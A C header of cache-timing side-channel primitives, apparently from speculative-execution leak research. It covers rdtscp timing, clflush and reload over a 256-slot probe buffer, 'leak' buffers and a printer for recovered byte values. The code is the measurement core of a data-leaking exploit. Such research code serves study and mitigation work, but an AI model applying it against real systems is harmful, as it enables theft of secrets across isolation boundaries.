#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <ctype.h>

#ifndef ITERS
#define ITERS 10000
#endif

#define PAGE_SIZE 4096
#define TIMING_THRESHOLD 160
#define PRINT_THRESHOLD 500
#define SECRET_INDEX 256


#include <sys/prctl.h>
#ifndef PR_SET_SPECULATION_CTRL
#define PR_SET_SPECULATION_CTRL 53
#endif
#ifndef PR_SPEC_DISABLE
#define PR_SPEC_DISABLE 4
#endif

#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

#define ALLOC_BUFFERS()\
	__attribute__((aligned(PAGE_SIZE))) size_t results[SECRET_INDEX] = {0};\
	unsigned char *reloadbuffer = (unsigned char *)mmap(NULL, 2 * PAGE_SIZE * SECRET_INDEX, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0) + 0x80;\
	unsigned char *leak = mmap(NULL, 2 * PAGE_SIZE * SECRET_INDEX, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
	unsigned char *privatebuf = mmap(NULL, PAGE_SIZE * 128, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);\
	(void)privatebuf;

static inline void enable_SSBM() {
        prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, PR_SPEC_FORCE_DISABLE, 0, 0);
}

static inline __attribute__((always_inline)) void enable_alignment_checks() {
	asm volatile(
		"pushf\n"
		"orl $(1<<18), (%rsp)\n"
		"popf\n"
	);
}

static inline __attribute__((always_inline)) void disable_alignment_checks() {
	asm volatile(
		"pushf\n"
		"andl $~(1<<18), (%rsp)\n"
		"popf\n"
	);
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;
	asm volatile("rdtscp\n"
		     : "=a" (lo), "=d" (hi)
		     :
		     : "rcx");
	return (hi << 32) | lo;
}

/* flush all lines of the reloadbuffer */
static inline __attribute__((always_inline)) void flush(unsigned char *reloadbuffer) {
	for (size_t k = 0; k < SECRET_INDEX; ++k) {
    // x is an odd way of changing the traversal order of k: 0 <= x < 256
		size_t x = ((k * 167) + 13) & (0xff);
    // strange that 1024 is used, wonder if that is a bug?
		volatile void *p = reloadbuffer + x * 1024;
		asm volatile("clflush (%0)\n"
			     :
			     :"r" (p)
		    );
	}
}

/* update results based on timing of reloads */
static inline __attribute__((always_inline)) void reload(unsigned char *reloadbuffer, size_t *results) {
	asm volatile("mfence\n");
	for (size_t k = 0; k < 256; ++k) {
		size_t x = ((k * 167) + 13) & (0xff);

		unsigned char *p = reloadbuffer + (1024 * x);

		uint64_t t0 = rdtscp();
		*(volatile unsigned char *)p;
		uint64_t dt = rdtscp() - t0;

		if (dt < TIMING_THRESHOLD) results[x]++;
	}
}

void print_results(size_t *results) {
	for (size_t c = 1; c < 256; ++c) {
		if (results[c] >= PRINT_THRESHOLD) {
			printf("%06zu: %02x (%c)\n", results[c], (unsigned int)c, isprint(c) ? (unsigned int)c : '?');
		}
	}
}
